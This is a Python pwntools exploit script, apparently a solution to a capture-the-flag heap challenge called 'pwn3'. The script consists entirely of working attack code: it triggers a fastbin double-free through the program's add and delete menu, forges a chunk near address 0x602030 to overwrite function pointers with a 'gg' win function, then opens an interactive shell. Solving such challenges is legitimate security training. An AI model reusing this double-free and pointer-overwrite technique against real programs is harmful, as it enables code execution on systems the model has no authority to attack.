import time
from pwn import *

elf = ELF("./pwn3")
io = process("./pwn3")

def add(idx, length, content):
    io.sendlineafter("2 delete paper\n", "1")
    time.sleep(0.01)
    io.sendlineafter(":", str(idx))
    time.sleep(0.01)
    io.sendlineafter(":", str(length))
    time.sleep(0.01)
    io.sendlineafter(":", content)
    time.sleep(0.01)

def delete(idx):
    io.sendlineafter("2 delete paper\n", "2")
    time.sleep(0.01)
    io.sendlineafter(":", str(idx))
    time.sleep(0.01)

if __name__ == "__main__":
    fakeChunk = 0x602030 + 2
    add(0, 0x30, '0000')
    add(1, 0x30, '1111')
    delete(0)  # 0
    delete(1)  # 1 -> 0
    delete(0)  # 0 -> 1 -> 0
    add(0, 0x30, p64(fakeChunk))  # 1 -> 0 -> fakeChunk
    add(1, 0x30, '1111')  # 0 -> fakeChunk
    add(2, 0x30, '2222')  # fakeChunk
    payload = p8(0) * (3 * 8 - 2) + p64(elf.sym['gg']) * 2  # payload = 'aaaaaaaabbbbbbbbccccccccdddddddd'
    add(3, 0x30, payload)
    io.sendlineafter("2 delete paper\n", "2")  # trigger strtol

    io.interactive()
